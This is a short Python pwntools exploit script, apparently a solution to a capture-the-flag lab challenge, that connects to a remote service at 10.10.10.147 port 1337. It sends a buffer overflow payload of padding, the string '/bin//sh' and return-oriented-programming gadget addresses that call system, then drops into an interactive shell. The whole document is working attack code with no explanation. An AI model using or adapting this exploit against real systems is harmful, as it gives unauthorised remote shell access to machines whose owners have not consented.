from pwn import *

context(terminal=['tmux', 'new-window'])
p = remote('10.10.10.147',1337)
#p = gdb.debug('./myapp', 'b main')

context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

pop_rdi = p64(0x401090)
sys = p64(0x40116e)
sh = "/bin//sh"         
junk = "A" * 112
junk2 = "B" * 8 
test = p64(0x401152)
pop_r13 = p64(0x401206)

payload = junk + sh + pop_r13 + sys + p64(0x0) + p64(0x0) +  test

p.sendline(payload)
p.interactive()

